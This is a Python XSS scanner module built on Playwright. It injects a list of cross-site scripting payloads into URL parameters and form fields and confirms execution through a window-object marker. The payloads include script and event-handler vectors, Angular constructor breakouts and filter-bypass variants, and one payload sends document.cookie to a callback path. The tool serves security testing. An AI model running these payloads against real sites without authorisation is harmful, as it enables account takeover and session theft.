"""
Advanced XSS Validator with Execution Validation
Real XSS detection through browser-based code execution verification
Eliminates false positives by confirming actual JavaScript execution
"""
import asyncio
import time
import re
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import logging
from urllib.parse import quote, urljoin

try:
    from playwright.async_api import Page
except ImportError:
    pass

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class XSSType(Enum):
    """XSS vulnerability types"""
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"
    ANGULAR_SSTI = "angular_ssti"
    TEMPLATE_INJECTION = "template_injection"
    EVENT_HANDLER = "event_handler"
    SCRIPT_INJECTION = "script_injection"


class ExecutionMethod(Enum):
    """Methods to verify XSS execution"""
    WINDOW_OBJECT = "window_object"
    CALLBACK_FUNCTION = "callback_function"
    DOM_MANIPULATION = "dom_manipulation"
    CONSOLE_LOG = "console_log"
    ALERT_BOX = "alert_box"
    NETWORK_REQUEST = "network_request"


@dataclass
class XSSFinding:
    """XSS vulnerability finding"""
    vulnerability_type: XSSType
    severity: str
    url: str
    parameter: str
    payload: str
    execution_method: ExecutionMethod
    evidence: str
    dom_snapshot: Optional[str] = None
    executed_code: Optional[str] = None
    timestamp: float = field(default_factory=time.time)
    false_positive_score: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "template-id": f"xss-{self.vulnerability_type.value}",
            "tool": "advanced-xss-validator",
            "info": {
                "name": f"XSS Vulnerability ({self.vulnerability_type.value.replace('_', ' ').title()})",
                "description": f"Cross-Site Scripting vulnerability via {self.parameter}. Execution confirmed via {self.execution_method.value}.",
                "severity": self.severity,
                "solution": "Implement proper output encoding, Content Security Policy, and input validation.",
                "cwe-id": ["CWE-79"],
                "references": []
            },
            "url": self.url,
            "matched-at": self.url,
            "parameter": self.parameter,
            "evidence": self.evidence[:500],
            "payload": self.payload,
            "false_positive_score": self.false_positive_score
        }


@dataclass
class XSSPayload:
    """XSS payload with metadata"""
    payload: str
    xss_type: XSSType
    detection_signature: str  # What to look for in response
    execution_signature: str  # What confirms execution
    bypass_technique: str = ""
    context: str = "html"  # html, attribute, javascript, url


class XSSPayloadGenerator:
    """Generates XSS payloads for different contexts"""

    def __init__(self):
        self.payloads = self._generate_payloads()

    def _generate_payloads(self) -> List[XSSPayload]:
        """Generate comprehensive XSS payload list"""
        payloads = []

        # Unique marker for execution verification
        # We'll use a unique ID that we can check in window object
        marker = "xss_test_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        # Basic script injection
        payloads.extend([
            XSSPayload(
                payload=f"<script>window.{marker}=true</script>",
                xss_type=XSSType.SCRIPT_INJECTION,
                detection_signature=f"<script>",
                execution_signature=marker,
                context="html"
            ),
            XSSPayload(
                payload=f"<script>document.body.setAttribute('data-{marker}', '1')</script>",
                xss_type=XSSType.SCRIPT_INJECTION,
                detection_signature="<script>",
                execution_signature=f"data-{marker}",
                context="html"
            ),
        ])

        # Event handlers
        payloads.extend([
            XSSPayload(
                payload=f"<img src=x onerror=\"window.{marker}=1\">",
                xss_type=XSSType.EVENT_HANDLER,
                detection_signature="onerror",
                execution_signature=marker,
                context="html"
            ),
            XSSPayload(
                payload=f"<svg onload=\"window.{marker}=true\">",
                xss_type=XSSType.EVENT_HANDLER,
                detection_signature="onload",
                execution_signature=marker,
                context="html"
            ),
            XSSPayload(
                payload=f"<body onload=\"window.{marker}=1\">",
                xss_type=XSSType.EVENT_HANDLER,
                detection_signature="onload",
                execution_signature=marker,
                context="html"
            ),
            XSSPayload(
                payload=f"<input onfocus=\"window.{marker}=true\" autofocus>",
                xss_type=XSSType.EVENT_HANDLER,
                detection_signature="onfocus",
                execution_signature=marker,
                context="html"
            ),
        ])

        # Angular SSTI (critical for Juice Shop)
        payloads.extend([
            XSSPayload(
                payload=f"{{{{constructor.constructor('window.{marker}=true')()}}}}",
                xss_type=XSSType.ANGULAR_SSTI,
                detection_signature="{{",
                execution_signature=marker,
                bypass_technique="angular_constructor",
                context="angular"
            ),
            XSSPayload(
                payload=f"{{{{$on.constructor('window.{marker}=1')()}}}}",
                xss_type=XSSType.ANGULAR_SSTI,
                detection_signature="{{$",
                execution_signature=marker,
                bypass_technique="angular_on",
                context="angular"
            ),
            XSSPayload(
                payload=f"{{{{[].pop.constructor('window.{marker}=true')()}}}}",
                xss_type=XSSType.ANGULAR_SSTI,
                detection_signature="{{[",
                execution_signature=marker,
                bypass_technique="angular_array",
                context="angular"
            ),
        ])

        # Template injection
        payloads.extend([
            XSSPayload(
                payload=f"${{window.{marker}=true}}",
                xss_type=XSSType.TEMPLATE_INJECTION,
                detection_signature="${",
                execution_signature=marker,
                context="template"
            ),
            XSSPayload(
                payload=f"#{marker}#",
                xss_type=XSSType.TEMPLATE_INJECTION,
                detection_signature="#",
                execution_signature=marker,
                context="ruby"
            ),
        ])

        # DOM-based XSS
        payloads.extend([
            XSSPayload(
                payload=f"javascript:window.{marker}=true",
                xss_type=XSSType.DOM_BASED,
                detection_signature="javascript:",
                execution_signature=marker,
                context="url"
            ),
            XSSPayload(
                payload=f"<iframe src=\"javascript:window.{marker}=1\">",
                xss_type=XSSType.DOM_BASED,
                detection_signature="javascript:",
                execution_signature=marker,
                context="html"
            ),
        ])

        # Filter bypass techniques
        payloads.extend([
            XSSPayload(
                payload=f"<ScRiPt>window.{marker}=true</ScRiPt>",
                xss_type=XSSType.SCRIPT_INJECTION,
                detection_signature="<script>",
                execution_signature=marker,
                bypass_technique="case_variation",
                context="html"
            ),
            XSSPayload(
                payload=f"<script/xss>window.{marker}=1</script>",
                xss_type=XSSType.SCRIPT_INJECTION,
                detection_signature="<script",
                execution_signature=marker,
                bypass_technique="attribute_bypass",
                context="html"
            ),
            XSSPayload(
                payload=f"<svg><script>window.{marker}=true</script></svg>",
                xss_type=XSSType.SCRIPT_INJECTION,
                detection_signature="<svg>",
                execution_signature=marker,
                bypass_technique="svg_wrapper",
                context="html"
            ),
        ])

        # Callback-based detection payloads
        payloads.extend([
            XSSPayload(
                payload=f"<script>fetch('/xss_callback?{marker}=' + document.cookie)</script>",
                xss_type=XSSType.SCRIPT_INJECTION,
                detection_signature="<script>",
                execution_signature="xss_callback",
                context="html"
            ),
        ])

        return payloads

    def get_payloads_for_context(self, context: str) -> List[XSSPayload]:
        """Get payloads suitable for specific context"""
        return [p for p in self.payloads if p.context == context or p.context == "html"]

    def get_payloads_by_type(self, xss_type: XSSType) -> List[XSSPayload]:
        """Get payloads by XSS type"""
        return [p for p in self.payloads if p.xss_type == xss_type]


class XSSValidator:
    """
    Advanced XSS validator with execution verification
    Uses Playwright to confirm actual code execution
    """

    def __init__(
        self,
        page: Optional['Page'] = None,
        timeout: int = 10000,
        callback_server_enabled: bool = False,
        callback_server_url: Optional[str] = None
    ):
        self.page = page
        self.timeout = timeout
        self.callback_server_enabled = callback_server_enabled
        self.callback_server_url = callback_server_url

        self.payload_generator = XSSPayloadGenerator()
        self.findings: List[XSSFinding] = []
        self._callback_received = False
        self._callback_data: Dict = {}

    async def validate_xss(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
        headers: Optional[Dict] = None,
        context: str = "html"
    ) -> List[XSSFinding]:
        """
        Validate XSS vulnerability with execution confirmation
        """
        if not self.page:
            logger.error("No Playwright page available")
            return []

        findings = []
        payloads = self.payload_generator.get_payloads_for_context(context)

        logger.info(f"Testing XSS on {url} (parameter: {parameter})")

        for payload_data in payloads[:15]:  # Limit payloads for speed
            result = await self._test_payload(
                url=url,
                parameter=parameter,
                payload=payload_data,
                method=method,
                headers=headers
            )

            if result:
                findings.append(result)
                logger.warning(f"XSS CONFIRMED: {payload_data.xss_type.value} via {parameter}")
                break  # One confirmed XSS is enough

        return findings

    async def _test_payload(
        self,
        url: str,
        parameter: str,
        payload: XSSPayload,
        method: str = "GET",
        headers: Optional[Dict] = None
    ) -> Optional[XSSFinding]:
        """Test single payload and verify execution"""
        try:
            # Build test URL/data
            if method == "GET":
                test_url = f"{url.split('?')[0]}?{parameter}={quote(payload.payload)}"
                # Add other params if present
                if '&' in url:
                    test_url += "&" + url.split('?')[1].split('=')[1] if '=' in url.split('?')[1] else ""
            else:
                test_url = url.split('?')[0]

            # Clear console before test
            await self.page.evaluate("console.clear()")

            # Set up execution detection
            marker = payload.execution_signature
            await self.page.evaluate(f"window.{marker} = undefined")

            # Navigate to URL
            try:
                response = await self.page.goto(
                    test_url if method == "GET" else url.split('?')[0],
                    wait_until="networkidle",
                    timeout=self.timeout
                )

                # For POST, submit form
                if method == "POST":
                    await self.page.fill(f'input[name="{parameter}"]', payload.payload)
                    await self.page.click('input[type="submit"], button[type="submit"]')
                    await self.page.wait_for_load_state("networkidle", timeout=5000)

            except Exception as e:
                logger.debug(f"Navigation error: {e}")
                return None

            # Wait for potential execution
            await asyncio.sleep(0.5)

            # Check execution via window object
            executed = await self._check_window_object(marker)

            if executed:
                # Get evidence
                dom_snapshot = await self.page.content()
                evidence = await self._gather_evidence(marker, payload)

                finding = XSSFinding(
                    vulnerability_type=payload.xss_type,
                    severity="critical",
                    url=test_url if method == "GET" else url,
                    parameter=parameter,
                    payload=payload.payload,
                    execution_method=ExecutionMethod.WINDOW_OBJECT,
                    evidence=evidence,
                    dom_snapshot=dom_snapshot[:2000] if dom_snapshot else None,
                    executed_code=payload.payload
                )

                self.findings.append(finding)
                return finding

            # Fallback: Check if payload is reflected (potential, not confirmed)
            page_content = await self.page.content()

            if payload.payload in page_content or self._decode_and_check(payload.payload, page_content):
                # Payload reflected but not executed - potential false positive
                # Still report but with lower confidence
                logger.debug(f"Payload reflected but not confirmed executed: {payload.payload[:50]}")

                # Could be WAF blocking or sanitization
                fp_score = 0.7  # High false positive probability

                finding = XSSFinding(
                    vulnerability_type=payload.xss_type,
                    severity="high",
                    url=test_url if method == "GET" else url,
                    parameter=parameter,
                    payload=payload.payload,
                    execution_method=ExecutionMethod.DOM_MANIPULATION,
                    evidence=f"Payload reflected in response (execution not confirmed)",
                    false_positive_score=fp_score
                )

                return finding

            return None

        except Exception as e:
            logger.error(f"XSS test error: {e}")
            return None

    async def _check_window_object(self, marker: str) -> bool:
        """Check if marker was set in window object"""
        try:
            result = await self.page.evaluate(f"typeof window.{marker} !== 'undefined'")
            return result
        except:
            return False

    async def _gather_evidence(self, marker: str, payload: XSSPayload) -> str:
        """Gather evidence of XSS execution"""
        evidence_parts = []

        # Check window object
        try:
            window_value = await self.page.evaluate(f"window.{marker}")
            evidence_parts.append(f"Window object set: {marker}={window_value}")
        except:
            pass

        # Check DOM for payload
        try:
            content = await self.page.content()
            if payload.payload in content:
                evidence_parts.append("Payload found in DOM")
        except:
            pass

        # Check console
        try:
            # This would require setting up console listener before navigation
            pass
        except:
            pass

        return "; ".join(evidence_parts) if evidence_parts else "Execution confirmed"

    def _decode_and_check(self, payload: str, content: str) -> bool:
        """Check if decoded payload is in content"""
        import html
        decoded = html.unescape(payload)
        return decoded in content

    async def validate_xss_batch(
        self,
        endpoints: List[Dict[str, Any]]
    ) -> List[XSSFinding]:
        """
        Validate XSS on multiple endpoints
        endpoints: List of {url, parameter, method, headers}
        """
        all_findings = []

        for endpoint in endpoints:
            findings = await self.validate_xss(
                url=endpoint.get('url', ''),
                parameter=endpoint.get('parameter', 'q'),
                method=endpoint.get('method', 'GET'),
                headers=endpoint.get('headers')
            )
            all_findings.extend(findings)

        return all_findings

    def get_findings(self) -> List[XSSFinding]:
        """Get all findings"""
        return self.findings

    def get_findings_summary(self) -> Dict[str, Any]:
        """Get summary of findings"""
        summary = {
            'total': len(self.findings),
            'confirmed': 0,
            'potential': 0,
            'by_type': {},
            'by_severity': {}
        }

        for finding in self.findings:
            if finding.false_positive_score < 0.5:
                summary['confirmed'] += 1
            else:
                summary['potential'] += 1

            # By type
            vtype = finding.vulnerability_type.value
            summary['by_type'][vtype] = summary['by_type'].get(vtype, 0) + 1

            # By severity
            sev = finding.severity
            summary['by_severity'][sev] = summary['by_severity'].get(sev, 0) + 1

        return summary


class XSSScanner:
    """
    High-level XSS scanner combining payload generation and validation
    """

    def __init__(self, page: Optional['Page'] = None):
        self.page = page
        self.validator = XSSValidator(page=page)

    async def scan_url(self, url: str) -> List[Dict[str, Any]]:
        """Scan URL for XSS vulnerabilities"""
        if not self.page:
            logger.error("No Playwright page available")
            return []

        findings = []

        # Common XSS injection points
        injection_points = await self._find_injection_points(url)

        for point in injection_points:
            point_findings = await self.validator.validate_xss(
                url=point['url'],
                parameter=point['parameter'],
                method=point.get('method', 'GET')
            )

            for finding in point_findings:
                findings.append(finding.to_dict())

        return findings

    async def _find_injection_points(self, url: str) -> List[Dict[str, Any]]:
        """Find potential XSS injection points"""
        points = []

        try:
            await self.page.goto(url, wait_until="networkidle")

            # Find all input fields
            inputs = await self.page.query_selector_all('input, textarea')
            for inp in inputs:
                try:
                    name = await inp.get_attribute('name')
                    if name:
                        points.append({
                            'url': url,
                            'parameter': name,
                            'method': 'POST',
                            'type': 'input'
                        })
                except:
                    pass

            # Find URL parameters
            if '?' in url:
                params = url.split('?')[1].split('&')
                for param in params:
                    if '=' in param:
                        points.append({
                            'url': url,
                            'parameter': param.split('=')[0],
                            'method': 'GET',
                            'type': 'url_param'
                        })

        except Exception as e:
            logger.error(f"Finding injection points error: {e}")

        return points


if __name__ == "__main__":
    print("XSS Validator module loaded")
    # Example usage would require Playwright setup
